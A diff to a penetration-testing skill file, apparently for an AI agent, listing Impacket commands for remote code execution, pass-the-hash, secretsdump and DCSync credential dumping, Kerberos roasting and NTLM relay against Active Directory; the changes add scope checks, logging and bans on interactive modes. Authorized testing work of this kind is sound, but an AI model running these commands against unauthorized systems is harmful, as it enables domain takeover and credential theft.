@@ -23,11 +23,11 @@ Turn valid creds or hashes into concrete AD/Windows actions — a shell, dumped 
 tickets — via the Impacket example scripts, capturing every artifact for the report + credential store.
 
 ## Steps
-1. Set up the run dir per AGENTS.md (`$RUN`, `mkdir -p "$RUN/loot" "$RUN/notes"`); scope inherited from `out/<engagement>/scope.txt`. Target format `[[domain/]username[:password]@]<target>`; `-hashes LM:NT` for pass-the-hash, `-k`/`-no-pass` for Kerberos, `-dc-ip` for the DC. Creds often from `netexec`.
-2. **Remote code exec:** `psexec.py 'DOMAIN/user:password@TARGET'` (SYSTEM, noisy service) or `wmiexec.py 'DOMAIN/user:password@TARGET'` (quieter); for pass-the-hash add `-hashes LMHASH:NTHASH` and omit the password. Tee to `run.log`.
+1. Extract actual hosts from credential-qualified tool arguments into `HOSTS`, including DC/relay targets. `RUN="$(python3 -I scripts/otus-log.py init --engagement "$ENGAGEMENT" --skill impacket)"`; `python3 -I scripts/otus-log.py scope-check --engagement "$ENGAGEMENT" --targets-file "$HOSTS" --run-dir "$RUN"`; nonzero STOP. Scope metadata never contains passwords/hashes.
+2. All commands use `python3 -I scripts/otus-log.py run --run-dir "$RUN" --targets-file "$HOSTS" -- <original argv>`. RCE argv: `psexec.py 'DOMAIN/user:password@TARGET'` or `wmiexec.py 'DOMAIN/user:password@TARGET'`; pass-the-hash adds original `-hashes LMHASH:NTHASH`. Do not invoke interactive forms: if no bounded one-shot form is available, stop and record the limitation.
 3. **Credential dumping:** `secretsdump.py 'DOMAIN/user:password@TARGET' -outputfile "$RUN/loot/secrets"`; DCSync from a DC: `secretsdump.py 'DOMAIN/user:password@DC' -just-dc -outputfile "$RUN/loot/ntds"`.
 4. **Roasting → hashcat** (hashcat format): `GetUserSPNs.py 'DOMAIN/user:password' -dc-ip <DC> -request -outputfile "$RUN/loot/kerberoast.txt"` and `GetNPUsers.py 'DOMAIN/' -usersfile users.txt -request -format hashcat -outputfile "$RUN/loot/asrep.txt"`.
-5. **NTLM relay (when applicable) + marker + run record:** `ntlmrelayx.py -tf targets.txt -smb2support -of "$RUN/loot/relay"` (`-i` interactive). Write a run marker (`no artifacts captured` if none), then `run.json`. Roast hashes feed `hashcat`; cracked creds loop back to `netexec`.
+5. Relay argv `ntlmrelayx.py -tf targets.txt -smb2support -of "$RUN/loot/relay"` must cover only checked targets and satisfy non-interactive/bounded rules; never use `-i` or hold a listener. `python3 -I scripts/otus-log.py finish --run-dir "$RUN" --status "$STATUS" --summary "$SUMMARY" --item 'scope-confirmed=ok:../../scope.json' --item 'action-executed=ok:run.log' --item 'results-recorded=ok:findings.md'`; add secret-free verified findings and actual artifacts/cleanup, or `no artifacts captured`.
 
 ## Modern tooling & alternatives
 Install via `pipx install impacket` (scripts as `psexec.py` or `impacket-psexec`). `netexec` wraps many
@@ -37,9 +37,9 @@ actions at scale; `certipy`/`rubeus` cover AD CS / Kerberos. Prefer `wmiexec`/`s
 ```yaml
 checklist:
   - id: scope-confirmed
-    desc: Engagement scope confirmed once in out/<engagement>/scope.txt (inherited, not re-confirmed); creds/hashes used are in scope
+    desc: Explicit engagement authorization, every endpoint, and credential/hash use checked
     verify: judge
-    evidence: ../../scope.txt
+    evidence: ../../scope.json
     on_fail: fail
     required: true
   - id: action-executed
@@ -65,4 +65,4 @@ checklist:
 ## Notes / pitfalls
 - Target format `[[domain/]username[:password]@]<target>`; pass-the-hash uses `-hashes LMHASH:NTHASH` (omit password); `-k`/`-no-pass` for Kerberos.
 - `secretsdump -just-dc` is **DCSync** — needs replication rights, high-signal; dump the minimum. Request roast hashes with `-format hashcat` so they drop into `hashcat`.
-- `psexec` creates a service (noisy/forensic); prefer `wmiexec`/`smbexec` when stealth matters. A run that captures nothing still writes `findings.md` ("no artifacts captured").
+- psexec creates a service: capture cleanup proof. No captured artifacts still finishes with an explicit summary.
